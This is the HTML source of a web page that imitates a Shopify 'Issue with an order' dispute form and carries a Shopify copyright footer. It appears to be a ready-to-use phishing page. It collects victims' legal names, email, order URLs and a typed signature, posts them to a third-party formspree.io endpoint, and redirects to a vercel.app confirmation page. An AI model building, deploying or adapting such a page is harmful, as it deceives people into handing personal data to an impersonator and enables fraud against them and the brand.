<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Issue with an order</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background: #fff;
      color: #1a1a1a;
      -webkit-font-smoothing: antialiased;
    }
    header {
      background: #000000;
      padding: 16px 24px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    header .logo {
      display: flex;
      align-items: center;
      gap: 8px;
    }
    header .menu-icon {
      display: flex;
      flex-direction: column;
      gap: 5px;
      cursor: pointer;
    }
    header .menu-icon span {
      display: block;
      width: 22px;
      height: 2px;
      background: #fff;
      border-radius: 2px;
    }
    .hero {
      background: #000000;
      padding: 32px 24px 40px;
    }
    .hero h1 {
      color: #fff;
      font-size: 32px;
      font-weight: 700;
      letter-spacing: -0.02em;
      line-height: 1.15;
    }
    main {
      max-width: 480px;
      margin: 0 auto;
      padding: 28px 20px 60px;
    }
    .intro {
      font-size: 14px;
      color: #333;
      line-height: 1.5;
      margin-bottom: 18px;
    }
    .intro a { color: #1a0dab; text-decoration: underline; }
    .field {
      width: 100%;
      border: 1px solid #ccc;
      border-radius: 8px;
      padding: 14px 12px;
      font-size: 14px;
      color: #111;
      background: #fff;
      margin-bottom: 10px;
      outline: none;
      transition: border-color 0.15s;
      font-family: inherit;
      appearance: none;
    }
    .field:focus { border-color: #555; }
    .field::placeholder { color: #aaa; }
    textarea.field { resize: vertical; min-height: 110px; }
    .order-url-hint {
      font-size: 12px;
      color: #777;
      margin-top: -6px;
      margin-bottom: 10px;
      padding-left: 4px;
    }
    .question {
      font-size: 14px;
      font-weight: 600;
      margin: 14px 0 8px;
    }
    .radio-option {
      display: flex;
      align-items: center;
      gap: 8px;
      margin-bottom: 7px;
      cursor: pointer;
      font-size: 14px;
    }
    .radio-option input[type="radio"] {
      width: 16px;
      height: 16px;
      cursor: pointer;
      flex-shrink: 0;
    }
    .declaration-title {
      font-size: 14px;
      font-weight: 600;
      margin: 16px 0 8px;
    }
    .checkbox-option {
      display: flex;
      align-items: flex-start;
      gap: 8px;
      margin-bottom: 10px;
      cursor: pointer;
      font-size: 14px;
      line-height: 1.45;
      color: #1a0dab;
    }
    .checkbox-option input[type="checkbox"] {
      width: 14px;
      height: 14px;
      margin-top: 2px;
      cursor: pointer;
      flex-shrink: 0;
    }
    .signature-label {
      font-size: 13px;
      color: #333;
      margin: 14px 0 8px;
      line-height: 1.5;
    }
    .btn-submit {
      width: 100%;
      padding: 15px;
      background: #000000;
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 16px;
      font-family: inherit;
      letter-spacing: 0.01em;
      transition: background 0.15s;
    }
    .btn-submit:hover { background: #333; }
    footer {
      text-align: center;
      padding: 28px 24px;
      border-top: 1px solid #e3e3e3;
    }
    footer p { font-size: 13px; color: #000000; }
  </style>
</head>
<body>

  <header>
    <div class="logo">
      <img src="1782535371849.png" alt="Logo" style="max-height: 48px; width: auto;">
    </div>
    <div class="menu-icon">
      <span></span><span></span><span></span>
    </div>
  </header>

  <div class="hero">
    <h1>Issue with an order</h1>
  </div>

  <main>
    <p class="intro">
      Report issues you have with a specific order from a merchant.
    </p>

    <form id="dispute-form" action="https://formspree.io/f/xeebgnvk" method="POST">
      <input class="field" type="text" name="first_name" placeholder="Legal first name">
      <input class="field" type="text" name="last_name" placeholder="Legal last name">
      <input class="field" type="email" name="email" placeholder="Email">

      <input class="field" type="text" name="order_url" placeholder="Order confirmation URL:">
      <p class="order-url-hint">Example: /123/account/orders/456</p>

      <textarea class="field" name="message" placeholder="Message"></textarea>

      <p class="question">Have you received your order?</p>
      <label class="radio-option"><input type="radio" name="received_order" value="Yes"> Yes</label>
      <label class="radio-option"><input type="radio" name="received_order" value="No"> No</label>

      <p class="declaration-title">Declaration</p>
      <label class="checkbox-option">
        <input type="checkbox" name="declaration_1">
        I attempted to contact the seller before reporting an issue with this order.
      </label>
      <label class="checkbox-option">
        <input type="checkbox" name="declaration_2">
        I acknowledge that a copy of this message, including any contact information provided above, will be forwarded to the related merchant.
      </label>

      <p class="signature-label">Typing your name in the box below will act as your electronic signature</p>
      <input class="field" type="text" name="signature" placeholder="Signature">

      <input type="hidden" name="_subject" value="New dispute report">

      <button type="button" class="btn-submit" id="submit-btn" onclick="submitForm()">Submit</button>
    </form>
  </main>

  <footer>
    <p>&copy; 2026 Shopify. All rights reserved.</p>
  </footer>

  <script>
    function submitForm() {
      var form = document.getElementById('dispute-form');
      var data = new FormData(form);

      fetch('https://formspree.io/f/xeebgnvk', {
        method: 'POST',
        body: data,
        headers: { 'Accept': 'application/json' }
      }).then(function(res) {
        if (res.ok) {
          window.location.href = 'https://issue-lac.vercel.app/form/dispute-confirmation.html';
        } else {
          alert('Something went wrong. Please try again.');
        }
      }).catch(function() {
        alert('Something went wrong. Please try again.');
      });
    }
  </script>

</body>
</html>
